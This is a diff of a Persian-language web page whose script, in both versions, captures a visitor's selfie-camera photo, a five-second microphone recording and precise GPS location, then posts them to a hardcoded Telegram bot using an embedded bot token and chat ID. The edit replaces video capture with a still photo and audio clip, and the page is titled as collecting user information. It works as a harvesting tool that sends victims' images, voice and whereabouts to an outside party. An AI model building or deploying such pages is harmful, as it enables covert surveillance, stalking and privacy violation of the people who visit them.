@@ -3,74 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>گرفتن دسترسی و ارسال به تلگرام</title>
+    <title>عکس + صدا + لوکیشن → تلگرام</title>
     <style>
-        body { font-family: Tahoma, sans-serif; text-align: center; padding: 20px; background: #f0f2f5; }
-        .container { max-width: 400px; margin: 0 auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        video { width: 100%; max-width: 300px; border-radius: 10px; margin: 10px 0; }
-        button { background: #0088cc; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; }
-        button:disabled { background: #ccc; cursor: not-allowed; }
-        #status { margin: 15px 0; font-weight: bold; color: #0088cc; }
-        #error { color: #d32f2f; margin: 10px 0; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0088cc; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto; display: none; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: Tahoma, sans-serif; text-align: center; padding: 20px; background: #f4f6f9; margin: 0; }
+        .card { max-width: 380px; margin: 20px auto; background: white; padding: 20px; border-radius: 16px; box-shadow: 0 6px 16px rgba(0,0,0,0.1); }
+        h2 { color: #1a73e8; margin-bottom: 10px; }
+        p { color: #555; font-size: 14px; }
+        #preview { width: 100%; max-width: 300px; border-radius: 12px; margin: 15px auto; display: block; border: 2px solid #ddd; }
+        button { background: #1a73e8; color: white; border: none; padding: 14px 28px; font-size: 16px; border-radius: 10px; cursor: pointer; margin: 10px 0; width: 100%; }
+        button:disabled { background: #aaa; cursor: not-allowed; }
+        .loader { border: 4px solid #f0f0f0; border-top: 4px solid #1a73e8; border-radius: 50%; width: 32px; height: 32px; animation: spin 1s linear infinite; margin: 15px auto; display: none; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        #status { margin: 15px 0; font-weight: bold; color: #1a73e8; }
+        #error { color: #d32f2f; margin: 10px 0; font-size: 14px; }
+        .icon { font-size: 24px; margin: 0 5px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>تست دسترسی</h2>
-        <p>روی دکمه کلیک کنید تا دسترسی‌ها گرفته بشه و به تلگرام فرستاده بشه.</p>
+    <div class="card">
+        <h2>گرفتن اطلاعات کاربر</h2>
+        <p>روی دکمه کلیک کنید تا عکس، صدا و لوکیشن شما ثبت و به تلگرام ارسال شود.</p>
 
-        <video id="webcam" autoplay playsinline muted></video>
+        <img id="preview" src="" alt="پیش‌نمایش عکس" style="display:none;">
         <div class="loader" id="loader"></div>
 
-        <button id="startBtn">شروع ضبط و ارسال</button>
+        <button id="startBtn">شروع و ارسال به تلگرام</button>
         <div id="status"></div>
         <div id="error"></div>
     </div>
 
     <script>
-        // ==== تنظیمات تلگرام ====
+        // تنظیمات تلگرام
         const BOT_TOKEN = '8584809785:AAH0ZKscGQtQQl38yTcjq4wMRiWw1xWEON4';  // توکن بات
-        const CHAT_ID = '6080665310';      // چت آیدی (عدد)
+        const CHAT_ID = '6080665310';      // چت آیدی
 
-        const webcam = document.getElementById('webcam');
+        const preview = document.getElementById('preview');
         const startBtn = document.getElementById('startBtn');
         const status = document.getElementById('status');
         const error = document.getElementById('error');
         const loader = document.getElementById('loader');
 
         let stream = null;
-        let recorder = null;
+        let audioRecorder = null;
 
         startBtn.addEventListener('click', async () => {
             startBtn.disabled = true;
             loader.style.display = 'block';
-            status.textContent = 'در حال درخواست دسترسی...';
+            status.textContent = 'در حال دسترسی به دوربین و میکروفون...';
             error.textContent = '';
+            preview.style.display = 'none';
 
             try {
-                // 1. دسترسی به وبکم و میکروفون
+                // 1. دسترسی به دوربین سلفی و میکروفون
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: 640, height: 480 },
                     audio: true
                 });
-                webcam.srcObject = stream;
-                status.textContent = 'دسترسی داده شد. در حال ضبط...';
 
-                // 2. گرفتن اسکرین‌شات
-                const photoBlob = await capturePhoto();
+                const videoTrack = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(videoTrack);
 
-                // 3. ضبط ویدیو 5 ثانیه‌ای
-                const videoBlob = await recordVideo(stream);
+                status.textContent = 'در حال گرفتن عکس...';
+                const photoBlob = await imageCapture.takePhoto();
 
-                // 4. گرفتن لوکیشن دقیق
+                // نمایش عکس
+                preview.src = URL.createObjectURL(photoBlob);
+                preview.style.display = 'block';
+
+                status.textContent = 'در حال ضبط صدا (۵ ثانیه)...';
+                const audioBlob = await recordAudio(stream);
+
+                status.textContent = 'در حال گرفتن لوکیشن...';
                 const location = await getLocation();
 
-                // 5. ارسال به تلگرام
-                await sendToTelegram(photoBlob, videoBlob, location);
+                status.textContent = 'در حال ارسال به تلگرام...';
+                await sendToTelegram(photoBlob, audioBlob, location);
 
-                status.textContent = 'همه چیز با موفقیت ارسال شد!';
+                status.innerHTML = 'همه چیز با موفقیت ارسال شد!';
             } catch (err) {
                 error.textContent = `خطا: ${err.message}`;
                 console.error(err);
@@ -81,32 +90,20 @@
             }
         });
 
-        // گرفتن عکس از وبکم
-        function capturePhoto() {
-            return new Promise((resolve) => {
-                const canvas = document.createElement('canvas');
-                canvas.width = webcam.videoWidth;
-                canvas.height = webcam.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(webcam, 0, 0);
-                canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
-            });
-        }
-
-        // ضبط ویدیو
-        function recordVideo(stream) {
+        // ضبط صدا (۵ ثانیه)
+        function recordAudio(stream) {
             return new Promise((resolve) => {
                 const chunks = [];
-                recorder = new MediaRecorder(stream, { mimeType: 'video/mp4' });
-                
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
+                audioRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+
+                audioRecorder.ondataavailable = e => chunks.push(e.data);
+                audioRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'audio/webm' });
                     resolve(blob);
                 };
 
-                recorder.start();
-                setTimeout(() => recorder.stop(), 5000); // 5 ثانیه
+                audioRecorder.start();
+                setTimeout(() => audioRecorder.stop(), 5000);
             });
         }
 
@@ -120,17 +117,19 @@
                         resolve({ latitude, longitude, accuracy, mapLink });
                     },
                     reject,
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
             });
         }
 
         // ارسال به تلگرام
-        async function sendToTelegram(photoBlob, videoBlob, location) {
-            const text = `
-📍 <b>لوکیشن دقیق</b>
-عرض جغرافیایی: <code>${location.latitude}</code>
-طول جغرافیایی: <code>${location.longitude}</code>
+        async function sendToTelegram(photoBlob, audioBlob, location) {
+            const caption = `
+عکس از دوربین سلفی
+صدا ضبط شده (۵ ثانیه)
+لوکیشن دقیق:
+عرض جغرافیایی: <code>${location.latitude.toFixed(6)}</code>
+طول جغرافیایی: <code>${location.longitude.toFixed(6)}</code>
 دقت: <code>${location.accuracy.toFixed(1)} متر</code>
 <a href="${location.mapLink}">نقشه</a>
             `.trim();
@@ -138,22 +137,22 @@
             // ارسال عکس
             const photoForm = new FormData();
             photoForm.append('chat_id', CHAT_ID);
-            photoForm.append('photo', photoBlob, 'webcam.jpg');
-            photoForm.append('caption', text);
+            photoForm.append('photo', photoBlob, 'selfie.jpg');
+            photoForm.append('caption', caption);
             photoForm.append('parse_mode', 'HTML');
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: photoForm
             });
 
-            // ارسال ویدیو
-            const videoForm = new FormData();
-            videoForm.append('chat_id', CHAT_ID);
-            videoForm.append('video', videoBlob, 'recording.mp4');
-            videoForm.append('caption', 'ویدیو ۵ ثانیه‌ای با صدا');
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+            // ارسال صدا
+            const audioForm = new FormData();
+            audioForm.append('chat_id', CHAT_ID);
+            audioForm.append('audio', audioBlob, 'voice_message.webm');
+            audioForm.append('caption', 'صدای ضبط شده');
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                 method: 'POST',
-                body: videoForm
+                body: audioForm
             });
         }
 
@@ -161,10 +160,9 @@
         function stopStream() {
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
-                webcam.srcObject = null;
             }
-            if (recorder && recorder.state === 'recording') {
-                recorder.stop();
+            if (audioRecorder && audioRecorder.state === 'recording') {
+                audioRecorder.stop();
             }
         }
     </script>
